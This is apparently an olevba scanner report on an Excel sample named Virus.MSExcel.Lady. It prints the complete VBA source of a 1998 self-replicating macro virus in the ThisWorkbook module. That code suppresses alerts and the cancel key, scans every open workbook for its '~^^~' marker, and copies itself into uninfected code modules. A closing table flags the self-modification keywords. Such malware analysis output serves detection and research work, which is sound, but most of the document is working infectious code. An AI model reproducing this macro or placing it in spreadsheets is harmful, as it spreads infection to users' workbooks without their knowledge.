olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Lady-dbea7cd0c239ba0bb554aa413c499e1518a8820c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Lady-dbea7cd0c239ba0bb554aa413c499e1518a8820c - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Lady-dbea7cd0c239ba0bb554aa413c499e1518a8820c - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Lady-dbea7cd0c239ba0bb554aa413c499e1518a8820c - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Lady-dbea7cd0c239ba0bb554aa413c499e1518a8820c - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Copyright (C) 1998 by FlyShadow ~^^~ - Lady
Private Sub Workbook_Deactivate()
On Error Resume Next
Application.EnableEvents = True
Application.DisplayAlerts = False
Application.ScreenUpdating = False
Application.EnableCancelKey = xlDisabled
η: For Each ι In Workbooks
For υ = 1 To ι.VBProject.VBComponents.Count
ν = ι.VBProject.VBComponents(υ).CodeModule.CountOfLines + 1
If λ = "" And ν < 70 Then
If ι.VBProject.VBComponents(υ).CodeModule.Find("~^^~", 0, 0, 0, 0, False, False) = True Then
λ = ι.VBProject.VBComponents(υ).CodeModule.Lines(1, ν): GoTo η: End If
ElseIf ι.VBProject.VBComponents(υ).CodeModule.Find("~^^~", 0, 0, 0, 0, False, False) = False Then
ν = ι.VBProject.VBComponents(υ).CodeModule.CountOfLines + 1
ι.VBProject.VBComponents(υ).CodeModule.InsertLines ν, λ
End If: Next: Next
End Sub
Private Sub Worksheet_Activate()
Workbook_Deactivate
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

